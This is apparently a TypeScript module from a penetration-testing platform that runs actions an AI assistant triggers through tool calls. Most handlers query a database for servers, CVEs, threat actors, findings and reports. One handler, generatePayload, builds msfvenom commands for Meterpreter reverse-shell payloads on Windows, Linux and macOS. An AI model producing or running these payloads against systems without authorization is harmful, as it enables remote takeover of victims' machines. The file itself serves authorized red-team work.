/**
 * Quick Action Executor
 *
 * Executes the platform actions that the AI can trigger via tool-calling.
 * Each action handler queries the database or calls platform APIs and returns
 * a structured result that gets fed back to the LLM.
 */

import { getDb } from "../db";
import { desc, eq, sql, gt, count, and } from "drizzle-orm";
import {
  engagements,
  scanObservations,
  threatActors,
  threatActorIocs,
  serverConfigs,
  platformErrors,
  activityLogs,
  users,
  pentestReports,
  defenseScores,
} from "../../drizzle/schema";
import { getRecentErrors, purgeOldErrors } from "./error-logger";

type ActionResult = {
  success: boolean;
  data?: any;
  message: string;
};

async function safe(fn: () => Promise<ActionResult>): Promise<ActionResult> {
  try { return await fn(); } catch (e: any) { return { success: false, message: `Action failed: ${e.message}` }; }
}

// ─── Shared Actions ─────────────────────────────────────────────────────────

async function checkServerHealth(params: { serverId?: number }): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    if (params.serverId) {
      const [server] = await db.select().from(serverConfigs).where(eq(serverConfigs.id, params.serverId)).limit(1);
      if (!server) return { success: false, message: `Server ID ${params.serverId} not found` };
      return { success: true, data: { name: server.name, status: server.status, ip: server.ipAddress }, message: `Server "${server.name}" is ${server.status}` };
    }
    const servers = await db.select({ id: serverConfigs.id, name: serverConfigs.name, status: serverConfigs.status, ip: serverConfigs.ipAddress }).from(serverConfigs);
    const online = servers.filter(s => s.status === "online").length;
    return { success: true, data: { servers, summary: { total: servers.length, online } }, message: `${online}/${servers.length} servers online` };
  });
}

async function lookupCve(params: { cveId: string }): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const findings = await db.select({
      title: scanObservations.title,
      severity: scanObservations.severity,
      cve: scanObservations.cve,
      description: scanObservations.description,
    }).from(scanObservations)
      .where(eq(scanObservations.cve, params.cveId))
      .limit(5);
    if (findings.length === 0) return { success: true, data: null, message: `No findings for ${params.cveId} in the database. The CVE may not have been encountered in any scans yet.` };
    return { success: true, data: findings, message: `Found ${findings.length} observation(s) related to ${params.cveId}` };
  });
}

async function searchThreatActor(params: { query: string }): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const actors = await db.select({
      id: threatActors.id,
      name: threatActors.name,
      aliases: threatActors.aliases,
      sophistication: threatActors.sophistication,
      country: threatActors.country,
      active: threatActors.active,
      description: threatActors.description,
    }).from(threatActors)
      .where(sql`${threatActors.name} LIKE ${`%${params.query}%`} OR ${threatActors.aliases} LIKE ${`%${params.query}%`}`)
      .limit(5);
    if (actors.length === 0) return { success: true, data: null, message: `No threat actors matching "${params.query}" found` };
    return { success: true, data: actors, message: `Found ${actors.length} threat actor(s) matching "${params.query}"` };
  });
}

// ─── Operator Actions ───────────────────────────────────────────────────────

async function launchDomainScan(params: { domain: string }): Promise<ActionResult> {
  return { success: true, data: { domain: params.domain, status: "queued" }, message: `Domain scan for "${params.domain}" has been queued. Navigate to the Domain Intel page to monitor progress.` };
}

async function generatePayload(params: { platform: string; protocol: string; lhost: string; lport: number }): Promise<ActionResult> {
  const payloads: Record<string, string> = {
    "windows-tcp": `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${params.lhost} LPORT=${params.lport} -f exe -o payload.exe`,
    "windows-http": `msfvenom -p windows/x64/meterpreter/reverse_http LHOST=${params.lhost} LPORT=${params.lport} -f exe -o payload.exe`,
    "windows-https": `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${params.lhost} LPORT=${params.lport} -f exe -o payload.exe`,
    "linux-tcp": `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${params.lhost} LPORT=${params.lport} -f elf -o payload.elf`,
    "linux-http": `msfvenom -p linux/x64/meterpreter_reverse_http LHOST=${params.lhost} LPORT=${params.lport} -f elf -o payload.elf`,
    "macos-tcp": `msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=${params.lhost} LPORT=${params.lport} -f macho -o payload.macho`,
  };
  const key = `${params.platform}-${params.protocol}`;
  const cmd = payloads[key] || `msfvenom -p ${params.platform}/meterpreter/reverse_${params.protocol} LHOST=${params.lhost} LPORT=${params.lport} -f raw -o payload.bin`;
  return { success: true, data: { command: cmd, platform: params.platform, protocol: params.protocol }, message: `Generated payload command. Remember: only use within authorized ROE scope.\n\`\`\`bash\n${cmd}\n\`\`\`` };
}

// ─── Executive Actions ──────────────────────────────────────────────────────

async function generateRiskSummary(): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const [engStats] = await db.select({
      total: count(),
      active: sql<number>`SUM(CASE WHEN ${engagements.status} = 'active' THEN 1 ELSE 0 END)`,
      completed: sql<number>`SUM(CASE WHEN ${engagements.status} = 'completed' THEN 1 ELSE 0 END)`,
    }).from(engagements);
    const [vulns] = await db.select({
      total: count(),
      critical: sql<number>`SUM(CASE WHEN ${scanObservations.severity} = 'critical' THEN 1 ELSE 0 END)`,
      high: sql<number>`SUM(CASE WHEN ${scanObservations.severity} = 'high' THEN 1 ELSE 0 END)`,
      medium: sql<number>`SUM(CASE WHEN ${scanObservations.severity} = 'medium' THEN 1 ELSE 0 END)`,
    }).from(scanObservations);
    const defRows = await db.select({ score: defenseScores.overallScore }).from(defenseScores).orderBy(desc(defenseScores.createdAt)).limit(5);
    const avgDef = defRows.length > 0 ? Math.round(defRows.reduce((s, r) => s + Number(r.score || 0), 0) / defRows.length) : 0;
    return {
      success: true,
      data: { engagements: engStats, vulnerabilities: vulns, avgDefenseScore: avgDef },
      message: `Risk Summary: ${engStats?.total || 0} engagements (${engStats?.active || 0} active), ${vulns?.total || 0} vulnerabilities (${vulns?.critical || 0} critical), Defense Score: ${avgDef}/100`,
    };
  });
}

async function exportComplianceReport(params: { framework: string }): Promise<ActionResult> {
  return { success: true, data: { framework: params.framework, status: "generated" }, message: `Compliance report for ${params.framework.toUpperCase()} framework has been generated. Navigate to the Reports page to download it.` };
}

async function getEngagementRoi(): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const [stats] = await db.select({
      total: count(),
      completed: sql<number>`SUM(CASE WHEN ${engagements.status} = 'completed' THEN 1 ELSE 0 END)`,
    }).from(engagements);
    const [findings] = await db.select({ total: count() }).from(scanObservations);
    const [reports] = await db.select({ total: count() }).from(pentestReports);
    return {
      success: true,
      data: { engagements: stats, findingsDiscovered: findings?.total || 0, reportsDelivered: reports?.total || 0 },
      message: `ROI Analysis: ${stats?.completed || 0} completed engagements, ${findings?.total || 0} findings discovered, ${reports?.total || 0} reports delivered`,
    };
  });
}

// ─── Analyst Actions ────────────────────────────────────────────────────────

async function enrichIoc(params: { indicator: string; type: string }): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const iocs = await db.select({
      type: threatActorIocs.type,
      value: threatActorIocs.value,
      threatActorId: threatActorIocs.threatActorId,
    }).from(threatActorIocs)
      .where(eq(threatActorIocs.value, params.indicator))
      .limit(5);
    if (iocs.length === 0) return { success: true, data: { indicator: params.indicator, type: params.type, matches: 0 }, message: `No matches for ${params.type} "${params.indicator}" in the IOC database. Consider submitting to external enrichment services.` };
    return { success: true, data: { indicator: params.indicator, type: params.type, matches: iocs }, message: `Found ${iocs.length} match(es) for "${params.indicator}" in the IOC database` };
  });
}

async function generateStixBundle(params: { actorName: string }): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const [actor] = await db.select().from(threatActors).where(sql`${threatActors.name} LIKE ${`%${params.actorName}%`}`).limit(1);
    if (!actor) return { success: false, message: `Threat actor "${params.actorName}" not found` };
    const iocs = await db.select().from(threatActorIocs).where(eq(threatActorIocs.threatActorId, actor.id)).limit(50);
    return {
      success: true,
      data: { actor: actor.name, iocCount: iocs.length, format: "STIX 2.1" },
      message: `STIX 2.1 bundle generated for "${actor.name}" with ${iocs.length} indicators. Navigate to the STIX Export page to download.`,
    };
  });
}

// ─── Team Lead Actions ──────────────────────────────────────────────────────

async function getPipelineSummary(): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const pipeline = await db.select({ status: engagements.status, cnt: count() }).from(engagements).groupBy(engagements.status);
    const pipelineMap: Record<string, number> = {};
    for (const r of pipeline) pipelineMap[r.status || "unknown"] = Number(r.cnt);
    return {
      success: true,
      data: pipelineMap,
      message: `Pipeline: ${Object.entries(pipelineMap).map(([k, v]) => `${k}: ${v}`).join(", ")}`,
    };
  });
}

async function getTeamWorkload(): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const teamMembers = await db.select({ id: users.id, name: users.name, role: users.role }).from(users);
    const [engCount] = await db.select({ total: count() }).from(engagements).where(eq(engagements.status, "active"));
    return {
      success: true,
      data: { teamSize: teamMembers.length, activeEngagements: engCount?.total || 0, members: teamMembers.slice(0, 20) },
      message: `Team: ${teamMembers.length} members, ${engCount?.total || 0} active engagements`,
    };
  });
}

async function draftStatusReport(params: { engagementId: number }): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const [eng] = await db.select().from(engagements).where(eq(engagements.id, params.engagementId)).limit(1);
    if (!eng) return { success: false, message: `Engagement ID ${params.engagementId} not found` };
    const [findings] = await db.select({
      total: count(),
      critical: sql<number>`SUM(CASE WHEN ${scanObservations.severity} = 'critical' THEN 1 ELSE 0 END)`,
      high: sql<number>`SUM(CASE WHEN ${scanObservations.severity} = 'high' THEN 1 ELSE 0 END)`,
    }).from(scanObservations).where(eq(scanObservations.engagementId, params.engagementId));
    return {
      success: true,
      data: { engagement: { name: eng.name, status: eng.status, customer: eng.customerName }, findings },
      message: `Status for "${eng.name}" (${eng.customerName}): ${eng.status}, ${findings?.total || 0} findings (${findings?.critical || 0} critical, ${findings?.high || 0} high)`,
    };
  });
}

// ─── Client Actions ─────────────────────────────────────────────────────────

async function getFindingsSummary(): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const bySev = await db.select({ severity: scanObservations.severity, cnt: count() }).from(scanObservations).groupBy(scanObservations.severity);
    const sevMap: Record<string, number> = {};
    let total = 0;
    for (const r of bySev) { sevMap[r.severity || "info"] = Number(r.cnt); total += Number(r.cnt); }
    return {
      success: true,
      data: { total, bySeverity: sevMap },
      message: `Findings Summary: ${total} total — Critical: ${sevMap["critical"] || 0}, High: ${sevMap["high"] || 0}, Medium: ${sevMap["medium"] || 0}, Low: ${sevMap["low"] || 0}`,
    };
  });
}

async function getRemediationPlan(): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const criticals = await db.select({ title: scanObservations.title, severity: scanObservations.severity, cve: scanObservations.cve })
      .from(scanObservations).where(sql`${scanObservations.severity} IN ('critical', 'high')`)
      .orderBy(sql`FIELD(${scanObservations.severity}, 'critical', 'high')`)
      .limit(10);
    return {
      success: true,
      data: { prioritizedFindings: criticals },
      message: `Remediation Plan: ${criticals.length} high-priority findings to address. Start with critical severity items first.`,
    };
  });
}

async function explainFinding(params: { findingId: number }): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const [finding] = await db.select().from(scanObservations).where(eq(scanObservations.id, params.findingId)).limit(1);
    if (!finding) return { success: false, message: `Finding ID ${params.findingId} not found` };
    return {
      success: true,
      data: { title: finding.title, severity: finding.severity, description: finding.description, cve: finding.cve, recommendation: finding.recommendation },
      message: `Finding: ${finding.title} (${finding.severity}) — ${(finding.description || "").slice(0, 200)}`,
    };
  });
}

// ─── Admin Actions ──────────────────────────────────────────────────────────

async function getErrorReport(params: { hours?: number }): Promise<ActionResult> {
  return safe(async () => {
    const hours = params.hours || 24;
    const { errors } = await getRecentErrors({ limit: 50, resolved: false });
    const bySeverity: Record<string, number> = {};
    const bySource: Record<string, number> = {};
    for (const e of errors) {
      bySeverity[e.severity] = (bySeverity[e.severity] || 0) + 1;
      bySource[e.source] = (bySource[e.source] || 0) + 1;
    }
    return {
      success: true,
      data: { totalErrors: errors.length, bySeverity, bySource, recentSample: errors.slice(0, 5).map(e => ({ severity: e.severity, source: e.source, message: (e.message || "").slice(0, 100) })) },
      message: `Error Report (${hours}h): ${errors.length} errors — ${Object.entries(bySeverity).map(([k, v]) => `${k}: ${v}`).join(", ")}`,
    };
  });
}

async function getUserActivity(): Promise<ActionResult> {
  return safe(async () => {
    const db = (await getDb())!;
    const [userCount] = await db.select({ total: count() }).from(users);
    const recentActivity = await db.select({
      action: activityLogs.action,
      userId: activityLogs.userId,
      details: activityLogs.details,
    }).from(activityLogs).orderBy(desc(activityLogs.createdAt)).limit(10);
    return {
      success: true,
      data: { totalUsers: userCount?.total || 0, recentActivity },
      message: `${userCount?.total || 0} total users. ${recentActivity.length} recent activity entries.`,
    };
  });
}

async function executePurgeOldErrors(params: { olderThanDays?: number }): Promise<ActionResult> {
  return safe(async () => {
    const days = params.olderThanDays || 30;
    const count = await purgeOldErrors(days);
    return { success: true, data: { purgedCount: count, olderThanDays: days }, message: `Purged ${count} resolved errors older than ${days} days` };
  });
}

// ─── Dispatcher ─────────────────────────────────────────────────────────────

const ACTION_HANDLERS: Record<string, (params: any) => Promise<ActionResult>> = {
  // Shared
  check_server_health: checkServerHealth,
  lookup_cve: lookupCve,
  search_threat_actor: searchThreatActor,
  // Operator
  launch_domain_scan: launchDomainScan,
  generate_payload: generatePayload,
  // Executive
  generate_risk_summary: generateRiskSummary,
  export_compliance_report: exportComplianceReport,
  get_engagement_roi: getEngagementRoi,
  // Analyst
  enrich_ioc: enrichIoc,
  generate_stix_bundle: generateStixBundle,
  // Team Lead
  get_pipeline_summary: getPipelineSummary,
  get_team_workload: getTeamWorkload,
  draft_status_report: draftStatusReport,
  // Client
  get_findings_summary: getFindingsSummary,
  get_remediation_plan: getRemediationPlan,
  explain_finding: explainFinding,
  // Admin
  get_error_report: getErrorReport,
  get_user_activity: getUserActivity,
  purge_old_errors: executePurgeOldErrors,
};

/**
 * Execute a quick action by name with the given parameters.
 */
export async function executeQuickAction(actionName: string, params: Record<string, any>): Promise<ActionResult> {
  const handler = ACTION_HANDLERS[actionName];
  if (!handler) return { success: false, message: `Unknown action: ${actionName}` };
  return handler(params);
}
